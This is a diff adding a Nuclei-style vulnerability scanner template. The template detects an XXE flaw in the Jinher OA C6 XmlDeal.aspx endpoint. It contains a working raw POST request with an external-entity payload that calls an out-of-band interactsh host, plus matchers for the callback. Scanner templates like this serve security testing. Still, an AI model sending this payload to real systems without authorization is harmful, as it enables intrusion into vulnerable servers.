@@ -1,0 +1,35 @@
+id: jinher-oa-jc6-XmlDeal-xxe
+info:
+  name: 金和OA-XmlDeal - xxe
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E9%87%91%E5%92%8COA-XmlDeal-XXE.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,jinher,oa,xxe
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>'
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
